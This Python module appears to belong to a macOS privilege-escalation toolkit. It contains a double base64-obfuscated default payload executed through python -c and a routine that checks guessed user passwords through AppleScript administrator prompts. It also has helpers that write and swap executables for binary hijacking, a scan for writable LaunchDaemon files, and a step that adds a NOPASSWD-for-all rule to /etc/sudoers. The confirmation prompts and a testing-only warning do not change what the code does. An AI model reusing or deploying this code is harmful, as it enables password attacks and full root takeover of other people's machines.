import os
import uuid
from distutils.version import LooseVersion
from getpass import getuser
import plistlib
from subprocess import PIPE, Popen
from xml.parsers.expat import ExpatError

try:
    input = raw_input
except NameError:
    pass

DEFAULT_COMMAND = """python -c \"$(echo aW1wb3J0IGJhc2U2NCwgb3M7IGV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYVdZZ2IzTXVaMlYwZFdsa0tDa2dQVDBnTURvZ2IzTXVjM2x6ZEdWdEtHSmhjMlUyTkM1aU5qUmtaV052WkdVb0oxcFhUbTlpZVVGcFVWVjRUVWxGUmsxVVJEQnZVVlY0VFV0VFFrOVVNVUpDVlRGT1dGSkViMmRSVlhoTlNXbEJLMUJwUVhaYVdGSnFURE5PTVZwSE9XeGpiazA5SnlrcERRcGxiSE5sT2lCd2NtbHVkQ2hpWVhObE5qUXVZalkwWkdWamIyUmxLQ2RXV0U1c1kybENjR041UW5WaU0xRm5ZMjA1ZG1SQlBUMG5LU2s9Jykp | base64 -D)\" """  # noqa: E501
USER = getuser()

def random_string():
    """generates random string"""
    return str(uuid.uuid4())[:8]

def default_browser():
    """gets default browser"""
    try:
        with open(
            os.path.expanduser("~")
            + "/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist", "rb"
        ) as f:
            plist = plistlib.load(f)
    except ExpatError:
        return
    handlers = plist.get("LSHandlers")
    for handler in handlers:
        scheme = handler.get("LSHandlerURLScheme")
        if scheme and scheme in ["https", "http"]:
            return handler.get("LSHandlerRoleAll")
    return

def interaction_prompt(prompt):
    """Prompts user for interaction confirmation"""
    try:
        response = input("\n[USER INTERACTION] {prompt} (y/N): ".format(prompt=prompt))
        return response and response[0].lower() == "y"
    except (KeyboardInterrupt, EOFError, IndexError):
        return False


def confirmation_prompt(prompt, require_yes=False):
    """Prompts user for explicit confirmation"""
    try:
        if require_yes:
            response = input("\n[CONFIRMATION REQUIRED] {prompt} (type 'yes' to confirm): ".format(prompt=prompt))
            return response.lower() == "yes"
        else:
            response = input("\n[CONFIRMATION] {prompt} (y/N): ".format(prompt=prompt))
            return response and response[0].lower() == "y"
    except (KeyboardInterrupt, EOFError, IndexError):
        return False


def check_writable_daemon_files():
    """Checks for writable files in LaunchDaemons and LaunchAgents directories"""
    writable_files = []
    daemon_paths = [
        "/Library/LaunchDaemons",
        "/Library/LaunchAgents",
        "/System/Library/LaunchDaemons",
        "/System/Library/LaunchAgents"
    ]
    
    for daemon_path in daemon_paths:
        if os.path.exists(daemon_path):
            try:
                for filename in os.listdir(daemon_path):
                    file_path = os.path.join(daemon_path, filename)
                    if os.path.isfile(file_path) and os.access(file_path, os.W_OK):
                        writable_files.append(file_path)
            except PermissionError:
                continue
    
    return writable_files


def check_daemon_vulnerability():
    """Checks and warns about writable daemon files"""
    writable_files = check_writable_daemon_files()
    
    if writable_files:
        print("\n\033[93m[!] WARNING: Found writable daemon files:\033[00m")
        for file_path in writable_files:
            print("\033[93m    - {}\033[00m".format(file_path))
        
        if not confirmation_prompt(
            "Writable daemon files detected. These could be exploited for privilege escalation. Continue?",
            require_yes=False
        ):
            return False
    
    return True

def app_installed(app_name):
    """checks if app installed"""
    paths = ["/Applications/" + app_name, "~/Applications/" + app_name]
    for path in paths:
        if os.path.isdir(path):
            return path
    return

def app_running(app_name):
    """checks if app running"""
    return (
        not os.system('pgrep -f "{app_name}" > /dev/null'.format(app_name=app_name))
        == 256
    )

def app_info(app_name):
    """gets app info"""
    app_path = app_installed(app_name)
    try:
        with open(app_path + "/Contents/Info.plist", "rb") as f:
            return plistlib.load(f)
    except ExpatError:
        return

def app_version(app_name):
    """checks app version"""
    app_path = app_installed(app_name)
    try:
        with open(app_path + "/Contents/Info.plist", "rb") as f:
            plist = plistlib.load(f)
    except ExpatError:
        return
    return LooseVersion(plist.get("CFBundleVersion"))

def kill_app(app_path):
    """kills app"""
    os.system("pkill -f {app_path}".format(app_path=app_path))

def osascript(command):
    """runs shell for osascript"""
    osa = Popen([command], shell=True, stdout=PIPE, stderr=PIPE)
    response = osa.communicate()[0].strip()
    if isinstance(response, bytes):
        return response.decode("utf-8")
    return response

def get_values(i_obj):
    """gets values recursively"""
    values = list()
    if isinstance(i_obj, list):
        t_values = i_obj
    elif isinstance(i_obj, dict):
        t_values = i_obj.values()
    for t_value in t_values:
        if isinstance(t_value, dict):
            values.extend(get_values(t_value))
        elif isinstance(t_value, list):
            values.extend(t_value)
        else:
            values.append(str(t_value))
    return values

def try_password(password, user=USER):
    """tries user passwords"""
    rand = random_string()
    payload = """osascript <<END
      set command to "echo {success}"
      return do shell script command user name "{user}" password "{password}" with administrator privileges
    END""".format(
        success=rand, user=user, password=password
    )
    response = osascript(payload)
    return rand in response

def generates_bin(
    bin_path, command=DEFAULT_COMMAND, shebang="#!/bin/bash", chmod="u+x"
):
    """generates executable"""
    with open(bin_path, "w") as bin_file:
        bin_file.write(shebang)
        bin_file.write(command)
    os.chmod(bin_path, chmod)
    return bin_path

def backup_bin(bin_path, extension=".bak"):
    """backups executable"""
    backup_path = bin_path + extension
    os.rename(bin_path, backup_path)
    return backup_path

def restore_bin(backup_path, extension=".bak"):
    """backups executable"""
    restore_path = backup_path.replace(extension, "")
    os.rename(backup_path, restore_path)
    return restore_path


def confirm_sudoers_modification():
    """Confirms user consent before modifying /etc/sudoers"""
    warning = """
    ⚠️  WARNING: About to modify /etc/sudoers file ⚠️
    
    This will add 'ALL ALL=(ALL) NOPASSWD: ALL' to /etc/sudoers, which allows
    ANY user to run sudo commands WITHOUT a password. This is a significant
    security risk and should only be done in controlled testing environments.
    """
    print("\033[93m{}\033[00m".format(warning))
    
    return confirmation_prompt(
        "Do you want to proceed with modifying /etc/sudoers?",
        require_yes=True
    )
